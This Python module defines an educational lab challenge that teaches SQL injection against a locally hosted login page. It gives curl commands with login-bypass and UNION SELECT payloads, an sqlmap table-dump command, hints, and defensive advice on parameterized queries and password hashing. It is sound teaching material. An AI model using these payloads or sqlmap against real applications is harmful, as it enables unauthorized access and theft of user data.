"""web-sqli: bypass a login form with SQL injection."""

from __future__ import annotations

from typing import List, Tuple

from cyberlab import targets
from cyberlab.challenges import Challenge, register
from cyberlab.workspace import Workspace


class WebSqli(Challenge):
    def setup(self, ws: Workspace) -> str:
        port = targets.start(ws, "webapp")
        return f"Target: http://127.0.0.1:{port}/login"

    def snippets(self, ws: Workspace) -> List[Tuple[str, str]]:
        url = f"http://127.0.0.1:{targets.port_of(ws, 'webapp')}"
        return [
            ("Log in as admin: the quote ends the string, -- comments out the password check",
             f"curl -s {url}/login --data-urlencode \"username=admin' --\" -d password=x"),
            ("Don't know a username? Make the WHERE clause true for every row",
             f"curl -s {url}/login --data-urlencode \"username=' OR 1=1 --\" -d password=x"),
            ("It's not only a login bypass: UNION reads any column, here admin's real password",
             f"curl -s {url}/login -d password=x --data-urlencode \\\n"
             "  \"username=' UNION SELECT password, 'x' FROM users WHERE username='admin' --\""),
            ("Let sqlmap find the injection and dump the whole table",
             f"sqlmap -u {url}/login --data 'username=a&password=b' --batch --dump"),
            ("The fixed login (a parameterized query): the same attack is just a wrong username",
             f"curl -s {url}/secure/login --data-urlencode \"username=admin' --\" -d password=x"),
        ]


register(WebSqli(
    id="web-sqli",
    title="SQL injection: log in as admin",
    track="web",
    difficulty="easy",
    goal=("The Northwind staff portal checks logins with a SQL query. Log in as "
          "admin without knowing the password. The admin console shows a flag."),
    hints=[
        "Try a single quote (') as the username. What does the error tell you about how the query is built?",
        "The query is roughly: SELECT ... WHERE username = '<you>' AND password = '<you>'. "
        "Can you end the username string early and make the rest of the line a comment?",
        "In SQL, -- starts a comment. Try the username  admin' --  with any password.",
    ],
    tools=["Firefox", "curl", "sqlmap"],
    learned=("The login built its SQL by pasting your input between quotes. Your own quote "
             "closed the string, so the rest of what you typed ran as SQL: the query became "
             "WHERE username = 'admin' --' AND password = '...', and everything after -- "
             "is a comment. The database never checked a password."),
    real_world=("Injection is how whole user tables end up for sale. Once input can change "
                "the query, an attacker isn't limited to logging in: UNION SELECT reads any "
                "table the application can, and on some databases injection can write files or "
                "run commands. It needs no special access, only a form field, and tools like "
                "sqlmap automate all of it."),
    defend=[
        "Use parameterized queries (placeholders) everywhere: cursor.execute(\"... WHERE "
        "username = ?\", (name,)). The value is sent separately and can never become SQL.",
        "Don't show database errors to users. The error message is what told you how the "
        "query was built.",
        "Store password hashes, not passwords, so a dumped table isn't a list of logins.",
        "Give the application's database account only the access it needs.",
    ],
    ap_unit="Unit 5",
    ap_topic="5.1 Application and Data Vulnerabilities and Attacks",
    ap_skill=["Analyze Risk", "Mitigate Risk", "Detect Attacks"],
))
